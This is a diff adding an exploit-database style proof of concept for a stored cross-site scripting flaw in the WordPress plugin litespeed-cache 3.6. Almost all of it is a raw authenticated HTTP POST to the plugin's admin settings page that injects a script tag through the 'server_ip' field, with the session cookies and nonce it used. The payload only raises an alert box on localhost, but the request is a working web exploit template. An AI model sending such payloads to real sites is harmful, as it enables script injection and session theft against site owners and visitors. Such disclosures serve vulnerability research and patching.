@@ -1,0 +1,33 @@
+# Exploit Title: WordPress Plugin litespeed-cache 3.6 - 'server_ip' Cross-Site Scripting
+# Date: 20-12-2020
+# Software Link: https://downloads.wordpress.org/plugin/litespeed-cache.3.6.zip
+# Version: litespeed-cache
+# Tested on: Windows 10 x64
+
+# Description:
+# A Stored Cross-site scripting (XSS) was discovered in wordpress plugins litespeed-cache 3.6
+# One parameters(server_ip) have Cross-Site Scripting.
+
+POST /wp-admin/admin.php?page=litespeed-general HTTP/1.1
+Host: localhost
+Content-Length: 374
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://localhost
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+(KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://localhost/wp-admin/admin.php?page=litespeed-general
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie:
+wordpress_a5beef43d228c89cc1d954ec4fcadda1=admin%7C1609289111%7CM6c2pV6VbnD2OElpSET6Aw3GhKFJBGdgetyfHtqxJkC%7C27d97999284897d8645200c65a7f508dffef6a9184800b2905627ccbd4d71806;
+wordpress_test_cookie=WP%20Cookie%20check;
+_lscache_vary=9effc614452472ce40565e73d3f4301c;
+wordpress_logged_in_a5beef43d228c89cc1d954ec4fcadda1=admin%7C1609289111%7CM6c2pV6VbnD2OElpSET6Aw3GhKFJBGdgetyfHtqxJkC%7Cd7e1a2a77822d410d7ebe2540b88dc68f908a031ceda6e884995ff419bfb6b38;
+wp-settings-1=libraryContent%3Dbrowse; wp-settings-time-1=1609116311
+Connection: close
+
+LSCWP_CTRL=save-settings&LSCWP_NONCE=af21ea74b2&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fadmin.php%3Fpage%3Dlitespeed-general&_settings-enroll%5B%5D=auto_upgrade&auto_upgrade=0&_settings-enroll%5B%5D=api_key&api_key=&_settings-enroll%5B%5D=server_ip&server_ip=%3Cscript%3Ealert%28%27Hoa%27%29%3C%2Fscript%3E&_settings-enroll%5B%5D=news&news=1&litespeed-submit=Save+Changes
